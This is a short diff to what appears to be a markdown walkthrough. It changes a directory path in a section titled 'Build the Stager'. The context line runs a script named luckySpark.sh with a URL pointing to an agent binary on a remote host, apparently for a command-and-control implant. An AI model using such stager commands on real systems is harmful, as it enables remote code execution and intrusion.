@@ -182,7 +182,7 @@ sed -i 's/#include <windows.h>/#pragma push_macro("A")\n#pragma push_macro("B")\
 ### Part 2 — Build the Stager
 
 ```bash
-cd /opt/Lucky-Spark
+cd ~/Lucky-Spark
 bash luckySpark.sh -u http://192.168.57.40:1918/basic_agent.x64.bin
 ```
 
